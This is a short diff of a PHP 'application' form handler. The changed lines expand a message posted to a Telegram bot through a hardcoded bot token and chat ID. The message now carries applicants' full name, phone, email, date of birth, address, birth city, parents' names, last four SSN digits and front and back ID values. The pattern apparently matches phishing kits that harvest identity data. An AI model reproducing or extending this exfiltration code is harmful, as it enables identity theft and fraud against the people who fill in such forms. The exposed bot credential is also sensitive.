@@ -78,12 +78,18 @@ $front_id, $back_id
 $botToken = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
 $chatId = "6513265609";
 
-$text = "New Application Submitted:\n"
-. "Name: $first_name $last_name\n"
-. "Phone: $phone\n"
-. "Email: $email\n"
-. "DOB: $dob\n"
-. "Address: $address";
+$text = "📄 New Application Submitted\n\n"
+. "👤 Name: $first_name $middle_name $last_name\n"
+. "📞 Phone: $phone\n"
+. "📧 Email: $email\n"
+. "🎂 DOB: $dob\n"
+. "🏠 Address: $address\n"
+. "🏙 Birth City: $birth_city\n"
+. "👨 Father: $father_name\n"
+. "👩 Mother: $mother_name\n"
+. "🧾 SSN (last 4): $ssn\n"
+. "🪪 Front ID: $front_id\n"
+. "🪪 Back ID: $back_id\n";
 
 file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));
 
